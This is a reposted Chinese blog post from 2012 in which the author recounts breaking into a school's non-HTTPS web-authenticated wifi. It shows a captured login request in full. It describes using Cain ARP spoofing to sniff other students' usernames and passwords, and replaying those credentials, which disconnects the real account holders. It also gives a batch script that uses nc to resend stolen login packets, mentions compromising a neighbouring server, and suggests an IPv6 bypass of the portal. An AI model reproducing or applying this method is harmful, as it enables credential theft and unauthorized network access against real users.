title: "非https协议web方式wifi认证突破"
id: 184
date: 2012-07-31 10:43:41
tags: 
- cain
- web wifi认证
- 嗅探
categories: 
- 技术文章
---

转自：法客 deleter

话说我是个游手好闲的人，趁着暑假四处游荡，投亲靠友。一日来到某校，看有wifi，如饥似渴的打算蹭个小网上上。做好字典破wpa，暴力破

wep的准备了都，连上wifi就傻眼了，web认证…

好吧，web认证。既然是web认证，少不了负责验证的服务器。经测试，随便输入一个网址后都会被重定向到A站的一个登陆页面。如果能做手

脚的话只能在这个页面上搞了。

know it then hack it。首先找到知情人士，得知开网要提前申请，并且此账户与mac绑定。这就给了我当头一棒。本来想着肯定有很多人密码

和用户名是一样的，而用户名又是学号，这样写个脚本暴力破解一个一个猜过去就行了。这样的话仅靠猜弱口令来登陆的话是不可能了。

既然输入网址能被重定向到一个页面，而且此页面所在的服务器是一个公网的ip，那么说，我肯定已经分配好ip了，仅差一个授权。

既然我已经有了一个ip，我就可以对所在的网段进行嗅探，如果能嗅探到登陆信息说不定还有点门路呢。

有了大致的思路，开工开工~

<!--more-->

首先开brup抓本地包。在登陆页面随便输入一个用户名和密码，被brup拦下。数据包内容如下：

```shell
POST /eportal/webgateuser.do?method=login_ajax_s26_in_out HTTP/1.1
Host: x.x.x.x
Proxy-Connection: keep-alive
Content-Length: 3864
Cache-Control: max-age=0
Origin: http://ooxx
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Cookie: EPORTAL_COOKIE_USERNAME=3530393031323137; EPORTAL_COOKIE_PASSWORD=3530393031323137; JSESSIONID=77E5D178759BD74801C9FAF8D4B4933F

s=69c73394ffea3cc2453dfd4cff2af4a5&amp;t=wireless&amp;ssid=ad3c77575724aefa351ab6744a2a38a0&amp;apmac=6db3d4ac6fdf391878c2635b7bc531fb&amp;mac=56053fdf38ba0a3ba46ad1428f46fe61&amp;port=f8821b8335bb27ee&amp;url=f58cd7a67bbfecbcf3027f3e4bf7b380fb7aa95efe039033&amp;vid=&amp;net_access_type=internet&amp;username=deleter&amp;usernameHidden=deleter&amp;pwd=deleter&amp;seczone=&amp;validcode=no_check&amp;tipinfoHidden=%3Cdiv+style%3D%22border-right%3A+%23ddd476+1px+solid%3B+padding-right%3A+10px%3B+border-top%3A+%23ddd476+1px+solid%3B+padding-left%3A+10px%3B+padding-bottom%3A+10px%3B+border-left%3A+%23ddd476+1px+solid%3B+padding-top%3A+10px%3B+border-bottom%3A+%23ddd476+1px+solid%3B+height%3A+90px%3B+background-color%3A+%23fdfadd%3B+text-align%3A+left%22%3E%0D%0A%3Cp+style%3D%22text-align%3A+center%22%3E%3Cspan+style%3D%22font-weight%3A+bold%3B+font-size%3A+12px%3B+color%3A+%23daa517%3B+line-height%3A+20px%22%3E%E4%B8%8A%E7%BD%91%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%EF%BC%9A%3C%2Fspan%3E%3C%2Fp%3E%0D%0A%3Cp+style%3D%22color%3A+%2302ae0a%3B+line-height%3A+17px%3B+text-align%3A+center%22%3E%E5%85%81%E8%AE%B8Web%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%E5%8F%AF%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8%E6%9C%AC%E9%A1%B5%E9%9D%A2%E8%AE%A4%E8%AF%81%EF%BC%8C%E6%97%A0%E9%A1%BB%E4%B8%8B%E8%BD%BD%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E8%BD%AF%E4%BB%B6%3C%2Fp%3E%0D%0A%3Cp%3E%3C%2Fp%3E%0D%0A%3C%2Fdiv%3E%0D%0A%3Cdiv+style%3D%22margin-left%3A+15px%3B+margin-right%3A+15px%22%3E%0D%0A%3Cdiv%3E%0D%0A%3Cul%3E%0D%0A++++%3Cli%3E%E5%9C%A8%E8%BF%9B%E8%A1%8CWeb%E8%AE%A4%E8%AF%81%E4%B9%8B%E5%89%8D%EF%BC%8C%E5%BB%BA%E8%AE%AE%E5%85%88%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%B0%E7%9A%84%E5%BA%94%E7%94%A8%E8%BD%AF%E4%BB%B6%EF%BC%8C%E5%A6%82FTP%E3%80%81MSN%E7%AD%89%E7%AD%89%3C%2Fli%3E%0D%0A++++%3Cli%3E%E5%A6%82%E6%9E%9C%E5%87%BA%E7%8E%B0%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E5%88%B0%E8%AE%A4%E8%AF%81%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E5%85%88%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%B0%E7%9A%84%E5%BA%94%E7%94%A8%E8%BD%AF%E4%BB%B6%EF%BC%8C%E5%86%8D%E9%87%8D%E6%96%B0%E6%89%93%E5%BC%80%E6%B5%8F%E8%A7%88%E5%99%A8%3C%2Fli%3E%0D%0A++++%3Cli%3E%E5%A6%82%E6%9E%9C%E8%A6%81%E4%B8%8B%E7%BA%BF%EF%BC%8C%E8%AF%B7%E7%82%B9%E5%87%BB%E4%B8%8B%E7%BA%BF%E6%8C%89%E9%92%AE%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8D%E5%85%B3%E9%97%AD%E6%B5%8F%E8%A7%88%E5%99%A8%E7%AA%97%E5%8F%A3%3C%2Fli%3E%0D%0A++++%3Cli%3E%E8%AE%A4%E8%AF%81%E6%88%90%E5%8A%9F%E5%90%8E%EF%BC%8C%E4%BC%9A%E6%9C%89%E6%A0%87%E9%A2%98%E4%B8%BA%E2%80%9CWeb%E8%AE%A4%E8%AF%81%E4%B8%8B%E7%BA%BF%E9%A1%B5%E9%9D%A2+%E8%AF%B7%E4%B8%8D%E8%A6%81%E5%85%B3%E9%97%AD%E8%AF%A5%E9%A1%B5%E9%9D%A2%E2%80%9D%E7%9A%84%E7%AA%97%E5%8F%A3%E5%BC%B9%E5%87%BA%EF%BC%8C%E8%AE%B0%E5%BD%95%E6%82%A8%E4%B8%8A%E7%BD%91%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%9B%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%E5%BC%B9%E5%87%BA%EF%BC%8C%E8%AF%B7%E6%A3%80%E6%9F%A5%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BE%E7%BD%AE%EF%BC%8C%E5%85%B3%E9%97%AD%E5%BC%B9%E5%87%BA%E7%AA%97%E5%8F%A3%E6%8B%A6%E6%88%AA%E5%B7%A5%E5%85%B7%E3%80%82%3C%2Fli%3E%0D%0A%3C%2Ful%3E%0D%0A%3C%2Fdiv%3E%0D%0A%3Cul%3E%0D%0A++++%3Cli%3EBefore+carrying+out+Web+authentication+is+recommended+that+you+turn+off+background+applications%2C+such+as+FTP%2C+MSN%2C+etc.%3C%2Fli%3E%0D%0A++++%3Cli%3EIf+unable+to+connect+to+the+authentication+page%2C+it+is+recommended+to+close+the+back-end+application+software%2C+and+then+re-open+the+browser.%3C%2Fli%3E%0D%0A++++%3Cli%3EIf+you+want+offline%2C+please+click+the+offline+button%2C+and+then+close+the+browser+window.%3C%2Fli%3E%0D%0A++++%3Cli%3EAuthentication+is+successful%2C+there+will+be+titled+%22Web+authentication+page+off+the+assembly+line%2C+do+not+close+the+page%22+window+pops+up%2C+record+your+Internet+access+information%3B+If+there+are+no+pop-up%2C+please+check+your+browser+settings%2C+close+the+pop-up+blocker+tool.%3C%2Fli%3E%0D%0A%3C%2Ful%3E%0D%0A%3C%2Fdiv%3E%0D%0A%3Cp%3E%C2%A0%3C%2Fp%3E
```

按照打探得的消息，整个数据包有用的参数只有mac、username、usernameHidden、pwd，其他的大致都是与无线路由什么的有关。最后那段

长长的参数是url编码的数据，在成功联网后还蛋疼的decode了下，反正不是什么重要的信息。

准备工作做好了，那就开嗅吧。

因为尝试多次发现usernameHidden与username的值是相等的，且mac的值可以在嗅探器的url一栏里看到，所以打开cain，找到HTTP Fields，

在username field里只留下username，password field里只留下pwd。在cain中调到arp欺骗这一项，选几个顺眼的ip，开始等密码。不一会就得

到了好几组密码。

最开始以为无线网卡的mac地址必须改成与账号所对应的mac一样，但是苦于抓到包的参数中mac一项是经过加密的，貌似是MD5加密。但是拿着

自己的mac，猜了几种不同的形式，本地计算MD5，但都与数据包中的值不同。后来想了想，即使我猜对了mac的形式，我也不可能逆出mac啊…

没办法，硬着头皮把自己包中的mac、username、usernameHidden、pwd修改成嗅探得到的用户名密码以及mac部分的值，用brup发出去。

上百度测试一下，唔，成功连上了~

嗅探真是一个可怕的东东啊~

按照原理的话，对于web验证的wifi，只要登陆页面不是https加密的，我们就可以用这种方法进行突破，用其他人的账户密码上网。

总结：

首先本地抓包查找数据包中的有用以及必要的信息，接下来嗅探得可以进行授权认证的信息，最后修改数据包发送至服务器完成验证。

后记：

实际中发现，这个验证不能用于多个人。即我蹭网之后，原主人的网就掉了。没办法，我只能抓了好几个人的密码之后挨个试了，希望原主人正好

离开~

嫌麻烦，写了个批处理，用nc发包。附上代码：

```bat
@echo off
Title Wifi蹭网 by delete
echo *******************************************************************************
echo Wifi蹭网免验证 by delete
echo *******************************************************************************
echo 请从以下学号中选择一个：
echo 1\. Xxxxxx
echo 2\. Xxxxxx
echo 3\. Xxxxxx
echo 4\. Xxxxxx
echo 5\. Xxxxxx
echo 6\. Xxxxxx
set choice=
set /p choice=请选择:
if not &quot;%Choice%&quot;==&quot;&quot; set Choice=%Choice:~0,1%
if /i &quot;%choice%&quot;==&quot;1&quot; goto st1
if /i &quot;%choice%&quot;==&quot;2&quot; goto st2
if /i &quot;%choice%&quot;==&quot;3&quot; goto st3
if /i &quot;%choice%&quot;==&quot;4&quot; goto st4
if /i &quot;%choice%&quot;==&quot;5&quot; goto st5
if /i &quot;%choice%&quot;==&quot;6&quot; goto st6

:st1
nc -n xx.xx.xx.xx 80 &lt; ./data/st1.txt
goto end
:st2
nc -n xx.xx.xx.xx 80 &lt; ./data/st2.txt
goto end
:st3
nc -n xx.xx.xx.xx 80 &lt; ./data/st3.txt
goto end
:st4
nc -n xx.xx.xx.xx 80 &lt; ./data/st4.txt
goto end
:st5
nc -n xx.xx.xx.xx 80 &lt; ./data/st5.txt
goto end
:st6
nc -n xx.xx.xx.xx 80 &lt; ./data/st6.txt
goto end

:end
```

用法是将nc.exe放在该bat脚本同一目录下，并新建data文件夹，存放有不同账户对应的数据包的信息的txt文件。具体的命名什么的看一下脚本就懂了。

有个bug是运行到调用nc时，会卡在nc提交数据包得到返回的界面，不能自动结束。运行前还要先随便打开一个网页，以完成本机参数初始化…

再后来，日下了与验证网页所在服务器同网段的一台服务器，装上cain怎么嗅都嗅不到，甚是郁闷。Arp欺骗那里显示half routing，没有一个full

routing。而嗅探其他的服务器却不是这样的。莫非装了牛b的防火墙？求大牛解答~

还有一个更奇葩的问题，几天之后，当我再次想嗅探一下来获得更多的用户名密码的时候，开cain嗅探居然进行arp欺骗的时候劫持不到数据包，有

点想不通了。
最后废话一句，很多学校都已经支持ipv6了，我当前测试的无线路由是支持ipv6的。而登陆验证只限于ipv4，这样其实直接就能上ipv6的网的。网

上有很多ipv6转ipv4的方法，其中一个是sixxs.org，我个人觉得最好的是Veno2这个软件。有机会有条件的话大家不妨百度下具体的方法试试~
